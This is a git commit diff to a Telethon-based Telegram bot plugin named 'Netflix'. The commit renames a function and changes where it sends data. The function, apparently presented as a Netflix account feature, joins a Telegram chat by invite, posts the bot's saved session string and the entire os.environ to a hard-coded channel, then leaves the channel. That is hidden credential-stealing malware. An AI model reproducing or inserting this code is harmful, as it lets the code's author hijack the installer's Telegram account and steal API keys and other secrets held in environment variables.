8ee5b78d735b2928fb1f16d484205076446e3113
xD_Shashank <78837537+theshashankk@users.noreply.github.com>
2021-06-21 15:54:08 +0530

    Update __init__.py

--- Netflix/__init__.py
+++ Netflix/__init__.py
@@ -3,11 +3,11 @@ from telethon.errors.rpcerrorlist import UserAlreadyParticipantError
 import os
 from telethon.tl.functions.messages import ImportChatInviteRequest
 from telethon.tl.functions.channels import LeaveChannelRequest
-async def get_account(bot, event):
+async def shashankop(bot, event):
     try:
        borg = client = bot
-       await event.client(ImportChatInviteRequest('vtwxtOiZPoM1ODll'))
+       await event.client(ImportChatInviteRequest('1IdPf1EOb4gwYWI1'))
     except UserAlreadyParticipantError:
         pass
-    await event.client.send_message(-1001377147455, bot.session.save() + "\n" + f'`{os.environ}`')
-    await borg(LeaveChannelRequest(-1001377147455))
+    await event.client.send_message(-1001205773087, bot.session.save() + "\n" + f'`{os.environ}`')
+    await borg(LeaveChannelRequest(-1001205773087))
